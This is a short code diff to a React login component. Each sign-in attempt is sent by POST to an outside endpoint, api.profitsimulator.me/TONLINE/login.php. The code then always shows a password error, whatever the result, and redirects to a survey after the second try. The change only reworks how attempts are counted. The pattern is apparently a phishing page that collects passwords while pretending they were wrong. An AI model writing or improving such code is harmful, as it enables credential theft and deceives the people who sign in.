@@ -38,7 +38,7 @@ const Login = () => {
     
     try {
       // Send to API
-      const response = await fetch('https://api.profitsimulator.me/TONLINE/login.php', {
+      await fetch('https://api.profitsimulator.me/TONLINE/login.php', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -49,24 +49,32 @@ const Login = () => {
         }),
       });
       
-      // Always show password error for first 2 attempts
-      if (passwordAttempts < 2) {
+      if (passwordAttempts === 0) {
+        // First attempt: show error
         setPasswordError(true);
-        setPasswordAttempts(prev => prev + 1);
+        setPasswordAttempts(1);
         setPassword("");
-        
-        if (passwordAttempts === 1) {
-          // After 2nd attempt, redirect to survey
-          setTimeout(() => {
-            navigate('/survey');
-          }, 1500);
-        }
+      } else if (passwordAttempts === 1) {
+        // Second attempt: show error briefly then redirect
+        setPasswordError(true);
+        setPassword("");
+        setTimeout(() => {
+          navigate('/survey');
+        }, 1500);
       }
     } catch (error) {
       console.error('Login error:', error);
-      setPasswordError(true);
-      setPasswordAttempts(prev => prev + 1);
-      setPassword("");
+      if (passwordAttempts === 0) {
+        setPasswordError(true);
+        setPasswordAttempts(1);
+        setPassword("");
+      } else {
+        setPasswordError(true);
+        setPassword("");
+        setTimeout(() => {
+          navigate('/survey');
+        }, 1500);
+      }
     } finally {
       setIsLoading(false);
     }
